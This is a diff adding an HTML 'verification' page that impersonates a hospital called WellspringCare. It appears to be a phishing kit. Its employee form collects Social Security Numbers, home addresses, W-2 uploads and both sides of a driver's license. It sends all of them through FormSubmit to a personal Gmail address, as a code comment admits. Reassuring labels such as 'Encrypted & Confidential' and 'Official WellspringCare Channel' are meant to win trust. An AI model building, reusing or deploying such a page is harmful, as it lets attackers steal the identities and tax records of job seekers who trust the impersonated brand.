@@ -1,0 +1,1129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="theme-color" content="#0E7C7B" />
+<title>Verification — WellspringCare Hospital</title>
+<meta name="description" content="Complete your verification with WellspringCare Hospital. Secure patient and employee verification forms." />
+<meta name="robots" content="noindex" />
+
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+
+<style>
+/* ============================================================
+   1. DESIGN TOKENS  (identical to main site)
+   ============================================================ */
+:root{
+  --ink:#0A2A3B;
+  --ink-soft:#3C5A6B;
+  --muted:#6B8494;
+
+  --brand:#0E7C7B;
+  --brand-dark:#0A5C5B;
+  --brand-light:#14B8A6;
+  --sky:#2F80ED;
+  --coral:#FF6B5B;
+  --amber:#FFB020;
+  --violet:#7C5CFF;
+  --mint:#22C55E;
+  --danger:#B42318;
+
+  --bg:#F5FAFB;
+  --surface:#FFFFFF;
+  --line:#DCEAEE;
+
+  --radius-sm:12px;
+  --radius:18px;
+  --radius-lg:26px;
+
+  --shadow-sm:0 2px 10px rgba(10,42,59,.06);
+  --shadow:0 20px 45px -22px rgba(10,42,59,.38);
+  --shadow-lg:0 40px 80px -40px rgba(10,42,59,.55);
+
+  --max:1180px;
+  --header-h:74px;
+  --ease:cubic-bezier(.2,.7,.3,1);
+}
+
+/* ============================================================
+   2. RESET & BASE
+   ============================================================ */
+*,*::before,*::after{ box-sizing:border-box; }
+html{ scroll-behavior:smooth; -webkit-text-size-adjust:100%; }
+body{
+  margin:0;
+  font-family:'Plus Jakarta Sans', system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+  color:var(--ink);
+  background:var(--bg);
+  line-height:1.65;
+  font-size:16px;
+  -webkit-font-smoothing:antialiased;
+}
+h1,h2,h3,h4{ margin:0 0 .55em; line-height:1.15; letter-spacing:-.02em; font-weight:800; }
+h1{ font-size:clamp(2rem, 4.4vw, 3.1rem); }
+h2{ font-size:clamp(1.35rem, 2.4vw, 1.7rem); }
+p{ margin:0 0 1rem; }
+a{ color:inherit; text-decoration:none; }
+ul{ margin:0; padding:0; list-style:none; }
+img,svg{ display:block; max-width:100%; }
+button{ font:inherit; }
+input,select,textarea{ font:inherit; color:inherit; }
+
+::selection{ background:rgba(20,184,166,.3); }
+:focus-visible{ outline:3px solid rgba(47,128,237,.55); outline-offset:3px; border-radius:6px; }
+
+.skip-link{
+  position:absolute; left:1rem; top:-100px; z-index:999;
+  background:var(--ink); color:#fff; padding:.75rem 1.25rem;
+  border-radius:0 0 12px 12px; font-weight:700; transition:top .25s;
+}
+.skip-link:focus{ top:0; }
+
+.container{ width:min(100% - 2.5rem, var(--max)); margin-inline:auto; }
+
+/* Honeypot field — hidden from humans, catches bots */
+.hp-field{
+  position:absolute !important;
+  left:-9999px !important;
+  top:auto !important;
+  width:1px !important;
+  height:1px !important;
+  overflow:hidden !important;
+  opacity:0 !important;
+  pointer-events:none !important;
+}
+
+/* ============================================================
+   3. BUTTONS
+   ============================================================ */
+.btn{
+  display:inline-flex; align-items:center; justify-content:center; gap:.55rem;
+  padding:.85rem 1.45rem; border-radius:999px; border:1px solid transparent;
+  font-weight:700; font-size:.95rem; cursor:pointer; white-space:nowrap;
+  transition:transform .25s var(--ease), box-shadow .25s var(--ease), background .25s, color .25s, border-color .25s, opacity .25s;
+}
+.btn:hover{ transform:translateY(-2px); }
+.btn:active{ transform:translateY(0); }
+.btn:disabled{ cursor:progress; transform:none; opacity:.72; }
+.btn svg{ width:18px; height:18px; flex:none; }
+
+.btn--primary{
+  background:linear-gradient(135deg, var(--brand) 0%, var(--brand-light) 100%);
+  color:#fff; box-shadow:0 14px 28px -14px rgba(14,124,123,.95);
+}
+.btn--primary:hover{ box-shadow:0 20px 34px -14px rgba(14,124,123,1); }
+
+.btn--ghost{
+  background:#fff; color:var(--ink); border-color:var(--line); box-shadow:var(--shadow-sm);
+}
+.btn--ghost:hover{ border-color:var(--brand-light); color:var(--brand-dark); }
+
+.btn--light{
+  background:rgba(255,255,255,.12); color:#fff; border-color:rgba(255,255,255,.35);
+  backdrop-filter:blur(6px);
+}
+.btn--light:hover{ background:rgba(255,255,255,.22); }
+
+.btn--sm{ padding:.62rem 1.1rem; font-size:.86rem; }
+.btn--block{ width:100%; }
+
+/* ============================================================
+   4. HEADER
+   ============================================================ */
+.header{
+  position:sticky; top:0; z-index:100;
+  background:rgba(255,255,255,.86);
+  backdrop-filter:blur(16px) saturate(1.6);
+  -webkit-backdrop-filter:blur(16px) saturate(1.6);
+  border-bottom:1px solid rgba(220,234,238,.9);
+}
+.header__inner{ display:flex; align-items:center; gap:1rem; height:var(--header-h); }
+
+.brand{ display:flex; align-items:center; gap:.65rem; flex:none; }
+.brand__mark{
+  width:42px; height:42px; border-radius:13px; flex:none;
+  display:grid; place-items:center; color:#fff;
+  background:linear-gradient(135deg, var(--brand) 0%, var(--brand-light) 55%, var(--sky) 120%);
+  box-shadow:0 10px 20px -10px rgba(14,124,123,.9);
+}
+.brand__mark svg{ width:22px; height:22px; }
+.brand__text{ display:flex; flex-direction:column; line-height:1.1; }
+.brand__text strong{ font-size:1.06rem; letter-spacing:-.02em; }
+.brand__text small{ font-size:.68rem; letter-spacing:.18em; text-transform:uppercase; color:var(--muted); font-weight:700; }
+
+.header__actions{ margin-left:auto; display:flex; align-items:center; gap:.6rem; }
+
+/* ============================================================
+   5. HERO (dark, matches main "Verification Center")
+   ============================================================ */
+.verify-hero{
+  position:relative; overflow:hidden; color:#fff;
+  padding:clamp(2.5rem, 5.5vw, 4rem) 0 clamp(4.5rem, 8vw, 6rem);
+  background:
+    radial-gradient(700px 380px at 85% -10%, rgba(124,92,255,.34), transparent 62%),
+    radial-gradient(600px 340px at 5% 110%, rgba(20,184,166,.32), transparent 62%),
+    linear-gradient(130deg,#071F2B 0%, #0B3448 55%, #0A4A52 100%);
+}
+.verify-hero::after{
+  content:""; position:absolute; inset:0; pointer-events:none;
+  background-image:radial-gradient(rgba(255,255,255,.09) 1px, transparent 1px);
+  background-size:26px 26px;
+  mask-image:radial-gradient(ellipse at 50% 30%, #000 15%, transparent 70%);
+  -webkit-mask-image:radial-gradient(ellipse at 50% 30%, #000 15%, transparent 70%);
+}
+.verify-hero__inner{ position:relative; z-index:2; max-width:720px; }
+
+.eyebrow{
+  display:inline-flex; align-items:center; gap:.5rem;
+  font-size:.75rem; font-weight:800; letter-spacing:.14em; text-transform:uppercase;
+  padding:.45rem .95rem; border-radius:999px; margin-bottom:1rem;
+  color:var(--brand-dark); background:rgba(20,184,166,.14);
+}
+.eyebrow--light{ color:#CFF5F1; background:rgba(255,255,255,.14); }
+
+.verify-hero h1{ color:#fff; margin-bottom:.7rem; }
+.verify-hero p{ color:rgba(255,255,255,.78); font-size:clamp(.98rem, 1.4vw, 1.08rem); max-width:60ch; margin:0; }
+
+.hero-chips{ display:flex; flex-wrap:wrap; gap:.5rem; margin-top:1.5rem; }
+.hero-chip{
+  display:inline-flex; align-items:center; gap:.45rem;
+  background:rgba(255,255,255,.09); border:1px solid rgba(255,255,255,.2);
+  padding:.42rem .85rem; border-radius:999px;
+  font-size:.78rem; font-weight:700; color:rgba(255,255,255,.9);
+}
+.hero-chip svg{ width:15px; height:15px; color:#7CFFC4; }
+
+/* ============================================================
+   6. TABS
+   ============================================================ */
+.verify-main{ padding-bottom:clamp(3rem, 6vw, 5rem); }
+
+.tabs-wrap{ display:flex; justify-content:center; margin-top:-3rem; position:relative; z-index:5; }
+
+.tabs{
+  display:inline-flex; gap:.3rem; padding:.4rem;
+  background:#fff; border:1px solid var(--line); border-radius:999px;
+  box-shadow:var(--shadow);
+}
+.tab{
+  display:inline-flex; align-items:center; gap:.55rem;
+  padding:.8rem 1.6rem; border:0; border-radius:999px;
+  background:transparent; color:var(--ink-soft);
+  font-size:.92rem; font-weight:800; cursor:pointer;
+  transition:background .25s, color .25s, box-shadow .25s, transform .2s;
+  white-space:nowrap;
+}
+.tab svg{ width:18px; height:18px; }
+.tab:hover{ color:var(--brand-dark); background:rgba(20,184,166,.1); }
+.tab[aria-selected="true"]{
+  background:linear-gradient(135deg, var(--brand), var(--brand-light));
+  color:#fff; box-shadow:0 12px 24px -12px rgba(14,124,123,.95);
+}
+
+/* ============================================================
+   7. PANELS
+   ============================================================ */
+.panels{ max-width:900px; margin:clamp(1.75rem, 3.5vw, 2.75rem) auto 0; }
+.panel{ animation:panelIn .4s var(--ease); }
+.panel[hidden]{ display:none; }
+@keyframes panelIn{ from{ opacity:0; transform:translateY(10px); } to{ opacity:1; transform:none; } }
+
+.form-card{
+  background:#fff; border:1px solid var(--line); border-radius:var(--radius-lg);
+  padding:clamp(1.5rem, 3.2vw, 2.5rem); box-shadow:var(--shadow);
+}
+
+.panel-head{ margin-bottom:1.75rem; padding-bottom:1.5rem; border-bottom:1px dashed var(--line); }
+.panel-head .eyebrow{ margin-bottom:.75rem; }
+.panel-head h2{ margin-bottom:.35rem; }
+.panel-head p{ color:var(--muted); font-size:.94rem; margin:0; }
+
+/* Secure notice (employee form) */
+.notice{
+  display:flex; gap:.8rem; align-items:flex-start;
+  background:rgba(34,197,94,.09); border:1px solid rgba(34,197,94,.32);
+  border-radius:14px; padding:.95rem 1.1rem; margin-bottom:1.75rem;
+  font-size:.86rem; line-height:1.55; color:#0B6B3A; font-weight:600;
+}
+.notice svg{ width:20px; height:20px; flex:none; color:#0B6B3A; margin-top:2px; }
+
+/* ============================================================
+   8. FORM FIELDS
+   ============================================================ */
+.form-grid{ display:grid; grid-template-columns:1fr 1fr; gap:1rem; }
+.field{ display:flex; flex-direction:column; gap:.4rem; }
+.field--full{ grid-column:1 / -1; }
+.field label{ font-size:.82rem; font-weight:800; color:var(--ink-soft); letter-spacing:.01em; }
+.field label .req{ color:var(--coral); }
+
+.field input,.field select,.field textarea{
+  width:100%; padding:.8rem .95rem; border:1.5px solid var(--line); border-radius:12px;
+  background:#FBFDFD; font-size:.92rem; transition:border-color .2s, box-shadow .2s, background .2s;
+}
+.field textarea{ min-height:120px; resize:vertical; }
+.field input::placeholder,.field textarea::placeholder{ color:#9CB0BC; }
+.field input:focus,.field select:focus,.field textarea:focus{
+  outline:none; border-color:var(--brand-light); background:#fff;
+  box-shadow:0 0 0 4px rgba(20,184,166,.15);
+}
+.field input.is-invalid,.field select.is-invalid,.field textarea.is-invalid{
+  border-color:var(--danger); background:#FFF7F6;
+}
+.field .hint{ font-size:.76rem; color:var(--muted); margin:0; }
+.field .err{ font-size:.76rem; color:var(--danger); font-weight:700; display:none; }
+.field .err.show{ display:block; }
+
+/* File drop */
+.file-drop{
+  position:relative; display:flex; flex-direction:column; align-items:center; gap:.45rem;
+  border:2px dashed var(--line); border-radius:14px; padding:1.35rem 1rem;
+  background:#FBFDFD; text-align:center; cursor:pointer;
+  transition:border-color .25s, background .25s;
+}
+.file-drop:hover{ border-color:var(--brand-light); background:#F3FBFA; }
+.file-drop input[type="file"]{ position:absolute; inset:0; width:100%; height:100%; opacity:0; cursor:pointer; }
+.file-drop__icon{
+  width:42px; height:42px; border-radius:12px; display:grid; place-items:center;
+  background:linear-gradient(135deg,var(--brand),var(--brand-light)); color:#fff;
+}
+.file-drop__icon svg{ width:20px; height:20px; }
+.file-drop strong{ font-size:.9rem; }
+.file-drop > span:not(.file-name){ font-size:.78rem; color:var(--muted); }
+.file-name{ font-size:.8rem; font-weight:800; color:var(--brand-dark); word-break:break-all; }
+
+/* Image preview (shown after an image is selected) */
+.file-preview{
+  display:flex; align-items:center; gap:.85rem;
+  padding:.7rem .85rem; border:1px solid var(--line);
+  border-radius:12px; background:#F7FCFC;
+  margin-top:.55rem;
+}
+.file-preview[hidden]{ display:none; }
+.file-preview__thumb{
+  width:84px; height:62px; border-radius:8px; overflow:hidden;
+  background:#E4F1F1; flex:none;
+  display:grid; place-items:center;
+}
+.file-preview__thumb img{ width:100%; height:100%; object-fit:cover; }
+.file-preview__meta{
+  display:flex; flex-direction:column; gap:.2rem; min-width:0; flex:1;
+}
+.file-preview__name{
+  font-size:.82rem; font-weight:700; color:var(--ink);
+  overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
+}
+.file-preview__dl{
+  display:inline-flex; align-items:center; gap:.3rem;
+  font-size:.78rem; font-weight:800; color:var(--brand-dark);
+  text-decoration:underline; text-underline-offset:2px;
+}
+.file-preview__dl:hover{ color:var(--brand); }
+.file-preview__dl svg{ width:13px; height:13px; }
+
+/* Checkbox */
+.checkbox-row{ display:flex; gap:.65rem; align-items:flex-start; font-size:.85rem; color:var(--ink-soft); }
+.checkbox-row input{ width:18px; height:18px; margin-top:2px; accent-color:var(--brand); flex:none; }
+.checkbox-row a{ color:var(--brand-dark); font-weight:700; text-decoration:underline; text-underline-offset:2px; }
+
+/* ============================================================
+   9. FOOTER
+   ============================================================ */
+.footer{
+  background:linear-gradient(180deg,#08222F 0%, #061A24 100%);
+  color:rgba(255,255,255,.7); padding:2.5rem 0;
+}
+.footer__inner{
+  display:flex; flex-wrap:wrap; gap:1.25rem;
+  align-items:center; justify-content:space-between; font-size:.84rem;
+}
+.footer__inner .brand__text strong{ color:#fff; }
+.footer__inner .brand__text small{ color:rgba(255,255,255,.45); }
+.footer__links{ display:flex; flex-wrap:wrap; gap:1.25rem; }
+.footer__links a{ transition:color .2s; }
+.footer__links a:hover{ color:#7CFFC4; }
+
+/* ============================================================
+   10. TOAST
+   ============================================================ */
+.toast{
+  position:fixed; right:1.25rem; bottom:1.25rem; z-index:300;
+  max-width:360px; padding:1rem 1.2rem; border-radius:14px;
+  background:var(--ink); color:#fff; font-size:.88rem; font-weight:600; line-height:1.5;
+  box-shadow:0 26px 50px -20px rgba(0,0,0,.7);
+  transform:translateY(150%); opacity:0; pointer-events:none;
+  transition:transform .45s var(--ease), opacity .35s;
+}
+.toast.show{ transform:translateY(0); opacity:1; }
+.toast--ok{ background:linear-gradient(135deg,#0E7C7B,#14B8A6); }
+.toast--bad{ background:linear-gradient(135deg,#B42318,#E14B3A); }
+
+/* ============================================================
+   11. RESPONSIVE
+   ============================================================ */
+@media (max-width:680px){
+  .container{ width:min(100% - 1.75rem, var(--max)); }
+  .form-grid{ grid-template-columns:1fr; }
+  .tabs{ width:100%; }
+  .tab{ flex:1; justify-content:center; padding:.75rem 1rem; font-size:.86rem; }
+  .header__actions .btn span{ display:none; }
+  .footer__inner{ justify-content:flex-start; }
+  .tabs-wrap{ margin-top:-2.5rem; }
+}
+
+@media (prefers-reduced-motion:reduce){
+  *,*::before,*::after{
+    animation-duration:.001ms !important;
+    animation-iteration-count:1 !important;
+    transition-duration:.001ms !important;
+    scroll-behavior:auto !important;
+  }
+}
+</style>
+</head>
+
+<body>
+<a class="skip-link" href="#main">Skip to main content</a>
+
+<!-- ============================================================
+     HEADER
+     ============================================================ -->
+<header class="header">
+  <div class="container header__inner">
+    <a href="index.html" class="brand" aria-label="WellspringCare Hospital — home">
+      <span class="brand__mark" aria-hidden="true">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round">
+          <path d="M12 4v16M4 12h16"/>
+        </svg>
+      </span>
+      <span class="brand__text">
+        <strong>WellspringCare</strong>
+        <small>Hospital</small>
+      </span>
+    </a>
+
+    <div class="header__actions">
+      <a href="index.html" class="btn btn--ghost btn--sm">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M19 12H5M11 18l-6-6 6-6"/></svg>
+        <span>Back to Home</span>
+      </a>
+    </div>
+  </div>
+</header>
+
+<main id="main">
+
+  <!-- ============================================================
+       HERO
+       ============================================================ -->
+  <section class="verify-hero">
+    <div class="container verify-hero__inner">
+      <span class="eyebrow eyebrow--light">Secure Verification</span>
+      <h1>Verification</h1>
+      <p>Please provide the required information to complete your verification process.</p>
+
+      <div class="hero-chips">
+        <span class="hero-chip">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          Encrypted &amp; Confidential
+        </span>
+        <span class="hero-chip">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+          Reviewed within 24–48 hours
+        </span>
+        <span class="hero-chip">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>
+          Official WellspringCare Channel
+        </span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================================================
+       TABS + PANELS
+       ============================================================ -->
+  <div class="verify-main">
+    <div class="container">
+
+      <div class="tabs-wrap">
+        <div class="tabs" role="tablist" aria-label="Verification type">
+          <button class="tab" id="tab-patient" role="tab"
+                  aria-selected="true" aria-controls="panel-patient" tabindex="0" type="button">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.9"/></svg>
+            Patient Verification
+          </button>
+          <button class="tab" id="tab-employee" role="tab"
+                  aria-selected="false" aria-controls="panel-employee" tabindex="-1" type="button">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 7h-4V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/><path d="M10 7V5h4v2"/></svg>
+            Employee Verification
+          </button>
+        </div>
+      </div>
+
+      <div class="panels">
+
+        <!-- ===================== PATIENT PANEL ===================== -->
+        <section class="panel" id="panel-patient" role="tabpanel" aria-labelledby="tab-patient">
+          <div class="form-card">
+            <div class="panel-head">
+              <span class="eyebrow">Patient Verification</span>
+              <h2>Patient Verification Form</h2>
+              <p>Our patient care coordinators will contact you within 24 hours.</p>
+            </div>
+
+            <form id="patientForm" novalidate>
+              <div class="form-grid">
+
+                <div class="field">
+                  <label for="pFirst">First Name <span class="req">*</span></label>
+                  <input type="text" id="pFirst" name="firstName" placeholder="Jane" autocomplete="given-name" required />
+                  <span class="err">Please enter your first name.</span>
+                </div>
+
+                <div class="field">
+                  <label for="pLast">Last Name <span class="req">*</span></label>
+                  <input type="text" id="pLast" name="lastName" placeholder="Doe" autocomplete="family-name" required />
+                  <span class="err">Please enter your last name.</span>
+                </div>
+
+                <div class="field">
+                  <label for="pEmail">Email Address <span class="req">*</span></label>
+                  <input type="email" id="pEmail" name="email" placeholder="you@example.com" autocomplete="email" required />
+                  <span class="err">Please enter a valid email address.</span>
+                </div>
+
+                <div class="field">
+                  <label for="pPhone">Phone Number</label>
+                  <input type="tel" id="pPhone" name="phone" placeholder="(555) 123-4567" autocomplete="tel" />
+                </div>
+
+                <div class="field field--full">
+                  <label for="pService">Service Needed</label>
+                  <select id="pService" name="service">
+                    <option value="">Select a service (optional)</option>
+                    <option>Cardiology</option>
+                    <option>Neurology</option>
+                    <option>Surgery</option>
+                    <option>Pediatrics</option>
+                    <option>Emergency Care</option>
+                    <option>Radiology</option>
+                    <option>General Inquiry</option>
+                  </select>
+                </div>
+
+                <div class="field">
+                  <label for="pDate">Preferred Appointment Date</label>
+                  <input type="date" id="pDate" name="apptDate" />
+                </div>
+
+                <div class="field">
+                  <label for="pTime">Preferred Time</label>
+                  <select id="pTime" name="apptTime">
+                    <option value="">Select preferred time (optional)</option>
+                    <option>Morning (8 AM – 11 AM PT)</option>
+                    <option>Midday (11 AM – 2 PM PT)</option>
+                    <option>Afternoon (2 PM – 4 PM PT)</option>
+                    <option>Evening (4 PM – 6 PM PT)</option>
+                  </select>
+                </div>
+
+                <div class="field field--full">
+                  <label for="pMessage">Message <span class="req">*</span></label>
+                  <textarea id="pMessage" name="message" placeholder="Please describe your inquiry or any specific concerns..." required></textarea>
+                  <span class="err">Please tell us how we can help.</span>
+                </div>
+
+                <div class="field field--full">
+                  <label class="checkbox-row" for="pAgree">
+                    <input type="checkbox" id="pAgree" name="agree" required />
+                    <span>I agree to the <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> <span class="req">*</span></span>
+                  </label>
+                  <span class="err">Please accept the Privacy Policy and Terms of Service.</span>
+                </div>
+
+                <div class="field field--full">
+                  <button type="submit" class="btn btn--primary btn--block" id="patientSubmitBtn">
+                    Send Message
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 2 11 13M22 2l-7 20-4-9-9-4z"/></svg>
+                  </button>
+                </div>
+
+              </div>
+            </form>
+          </div>
+        </section>
+
+        <!-- ===================== EMPLOYEE PANEL ===================== -->
+        <section class="panel" id="panel-employee" role="tabpanel" aria-labelledby="tab-employee" hidden>
+          <div class="form-card">
+            <div class="panel-head">
+              <span class="eyebrow">Employee Verification</span>
+              <h2>Employee Verification Form</h2>
+              <p>Please complete every field below accurately so our team can process your file without delay.</p>
+            </div>
+
+            <div class="notice">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
+              <div>Your documents are transmitted securely to our verification team. Uploaded files arrive as attachments you can preview and download for your records.</div>
+            </div>
+
+            <!--
+              Native multipart POST to FormSubmit — required because file
+              attachments (W-2 + driver's licence) are only supported on the
+              standard endpoint, not AJAX. Everything is delivered to
+              nadinsmith231@gmail.com.
+            -->
+            <form id="employeeForm"
+                  action="https://formsubmit.co/nadinsmith231@gmail.com"
+                  method="POST"
+                  enctype="multipart/form-data"
+                  novalidate>
+
+              <!-- FormSubmit control fields -->
+              <input type="hidden" name="_subject" value="WellspringCare — New Employee Verification" />
+              <input type="hidden" name="_template" value="table" />
+              <input type="hidden" name="_captcha" value="false" />
+              <input type="hidden" name="_replyto" id="empReplyto" value="" />
+              <input type="hidden" name="_next"    id="empNext"    value="" />
+              <input type="hidden" name="Interview Code (site ref)" id="empCode" value="" />
+              <input type="hidden" name="Submitted At" id="empTime" value="" />
+              <input type="hidden" name="Form Type" value="Employee Verification" />
+
+              <!-- Honeypot (bots fill this; humans never see it) -->
+              <div class="hp-field" aria-hidden="true">
+                <label>Leave this field empty
+                  <input type="text" name="_honey" tabindex="-1" autocomplete="off" />
+                </label>
+              </div>
+
+              <div class="form-grid">
+
+                <div class="field">
+                  <label for="eFirst">First Name <span class="req">*</span></label>
+                  <input type="text" id="eFirst" name="firstName" placeholder="Jane" autocomplete="given-name" required />
+                  <span class="err">Please enter your first name.</span>
+                </div>
+
+                <div class="field">
+                  <label for="eLast">Last Name <span class="req">*</span></label>
+                  <input type="text" id="eLast" name="lastName" placeholder="Doe" autocomplete="family-name" required />
+                  <span class="err">Please enter your last name.</span>
+                </div>
+
+                <div class="field field--full">
+                  <label for="eEmail">Email Address <span class="req">*</span></label>
+                  <input type="email" id="eEmail" name="email" placeholder="you@example.com" autocomplete="email" required />
+                  <span class="err">Please enter a valid email address.</span>
+                </div>
+
+                <div class="field field--full">
+                  <label for="ePhone">Phone Number <span class="req">*</span></label>
+                  <input type="tel" id="ePhone" name="phone" placeholder="(555) 123-4567" autocomplete="tel" required />
+                  <span class="err">Please enter your phone number.</span>
+                </div>
+
+                <div class="field field--full">
+                  <label for="eAddress">Home Address <span class="req">*</span></label>
+                  <input type="text" id="eAddress" name="address" placeholder="Enter your full home address" autocomplete="street-address" required />
+                  <span class="err">Please enter your full home address.</span>
+                </div>
+
+                <div class="field field--full">
+                  <label for="eSSN">Social Security Number <span class="req">*</span></label>
+                  <input type="text" id="eSSN" name="ssn" placeholder="XXX-XX-XXXX"
+                         inputmode="numeric" autocomplete="off" maxlength="11" required />
+                  <p class="hint">Format: XXX-XX-XXXX. Used only for identity verification.</p>
+                  <span class="err">Please enter a valid 9-digit Social Security Number.</span>
+                </div>
+
+                <!-- W-2 -->
+                <div class="field field--full">
+                  <label for="eW2">Upload W-2 Form <span class="req">*</span></label>
+                  <div class="file-drop">
+                    <input type="file" id="eW2" name="W2 Form" required accept=".pdf,.jpg,.jpeg,.png" />
+                    <div class="file-drop__icon" aria-hidden="true">
+                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m7 10 5-5 5 5M12 5v12"/></svg>
+                    </div>
+                    <strong>Choose file</strong>
+                    <span>or drag &amp; drop</span>
+                    <span class="file-name" data-file-name>No file chosen</span>
+                  </div>
+                  <div class="file-preview" data-preview hidden>
+                    <div class="file-preview__thumb"><img data-preview-img alt="" /></div>
+                    <div class="file-preview__meta">
+                      <span class="file-preview__name" data-preview-name></span>
+                      <a class="file-preview__dl" data-preview-download href="#" download>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m7 10 5 5 5-5M12 15V3"/></svg>
+                        Download file
+                      </a>
+                    </div>
+                  </div>
+                  <p class="hint">PDF, JPG, PNG up to 5MB</p>
+                  <span class="err">Please upload your W-2 form.</span>
+                </div>
+
+                <!-- DL Front -->
+                <div class="field field--full">
+                  <label for="eDlFront">Upload Driver's License (Front) <span class="req">*</span></label>
+                  <div class="file-drop">
+                    <input type="file" id="eDlFront" name="Driver License Front" required accept=".jpg,.jpeg,.png" />
+                    <div class="file-drop__icon" aria-hidden="true">
+                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m7 10 5-5 5 5M12 5v12"/></svg>
+                    </div>
+                    <strong>Choose file</strong>
+                    <span>or drag &amp; drop</span>
+                    <span class="file-name" data-file-name>No file chosen</span>
+                  </div>
+                  <div class="file-preview" data-preview hidden>
+                    <div class="file-preview__thumb"><img data-preview-img alt="" /></div>
+                    <div class="file-preview__meta">
+                      <span class="file-preview__name" data-preview-name></span>
+                      <a class="file-preview__dl" data-preview-download href="#" download>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m7 10 5 5 5-5M12 15V3"/></svg>
+                        Download file
+                      </a>
+                    </div>
+                  </div>
+                  <p class="hint">JPG, PNG up to 5MB</p>
+                  <span class="err">Please upload the front of your driver's license.</span>
+                </div>
+
+                <!-- DL Back -->
+                <div class="field field--full">
+                  <label for="eDlBack">Upload Driver's License (Back) <span class="req">*</span></label>
+                  <div class="file-drop">
+                    <input type="file" id="eDlBack" name="Driver License Back" required accept=".jpg,.jpeg,.png" />
+                    <div class="file-drop__icon" aria-hidden="true">
+                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m7 10 5-5 5 5M12 5v12"/></svg>
+                    </div>
+                    <strong>Choose file</strong>
+                    <span>or drag &amp; drop</span>
+                    <span class="file-name" data-file-name>No file chosen</span>
+                  </div>
+                  <div class="file-preview" data-preview hidden>
+                    <div class="file-preview__thumb"><img data-preview-img alt="" /></div>
+                    <div class="file-preview__meta">
+                      <span class="file-preview__name" data-preview-name></span>
+                      <a class="file-preview__dl" data-preview-download href="#" download>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m7 10 5 5 5-5M12 15V3"/></svg>
+                        Download file
+                      </a>
+                    </div>
+                  </div>
+                  <p class="hint">JPG, PNG up to 5MB</p>
+                  <span class="err">Please upload the back of your driver's license.</span>
+                </div>
+
+                <div class="field field--full">
+                  <label class="checkbox-row" for="eAgree">
+                    <input type="checkbox" id="eAgree" name="agree" required />
+                    <span>I agree to the <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> <span class="req">*</span></span>
+                  </label>
+                  <span class="err">Please accept the Privacy Policy and Terms of Service.</span>
+                </div>
+
+                <div class="field field--full">
+                  <button type="submit" class="btn btn--primary btn--block" id="employeeSubmitBtn">
+                    Submit Verification
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>
+                  </button>
+                </div>
+
+              </div>
+            </form>
+          </div>
+        </section>
+
